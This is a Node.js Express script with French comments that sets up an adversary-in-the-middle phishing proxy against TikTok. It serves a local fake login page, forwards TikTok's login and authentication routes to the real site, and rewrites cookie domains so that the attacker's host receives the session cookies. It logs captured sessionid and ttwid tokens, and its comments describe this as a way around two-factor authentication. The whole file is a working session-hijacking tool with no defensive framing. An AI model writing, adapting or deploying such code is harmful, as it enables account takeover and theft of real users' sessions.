const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');
const cookieParser = require('cookie-parser');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cookieParser());

// 1. On affiche tes fichiers locaux (index.html, tiktok.png)
app.use(express.static(path.join(__dirname)));

// 2. Configuration du Middleware Proxy
const proxyOptions = {
    target: 'https://www.tiktok.com',
    changeOrigin: true,
    secure: true,
    cookieDomainRewrite: "", // Supprime le domaine .tiktok.com pour que ton navigateur accepte les cookies sur Render
    onProxyRes: function (proxyRes, req, res) {
        // --- INTERCEPTION DES COOKIES (BYPASS 2FA) ---
        const setCookie = proxyRes.headers['set-cookie'];
        if (setCookie) {
            console.log("\n[!] JETONS DE SESSION DÉTECTÉS :");
            setCookie.forEach(cookie => {
                // On cherche les cookies critiques : sessionid, sid, ttwid
                if (cookie.includes('sessionid') || cookie.includes('ttwid')) {
                    console.log(">>> CAPTURE : " + cookie.split(';')[0]);
                }
            });
            console.log("----------------------------------\n");
        }
    },
    onProxyReq: function (proxyReq, req, res) {
        // Optionnel : On peut forcer certains headers pour éviter d'être bloqué trop vite
        proxyReq.setHeader('Referer', 'https://www.tiktok.com/');
    }
};

// 3. On crée le tunnel
const proxy = createProxyMiddleware(proxyOptions);

// Redirection des routes critiques de TikTok vers notre proxy
app.use('/api/auth', proxy);
app.use('/passport', proxy);
app.use('/login', proxy);

app.listen(PORT, () => {
    console.log("========================================");
    console.log("  BACOPS REVERSE PROXY READY (PORT " + PORT + ")");
    console.log("========================================");
});
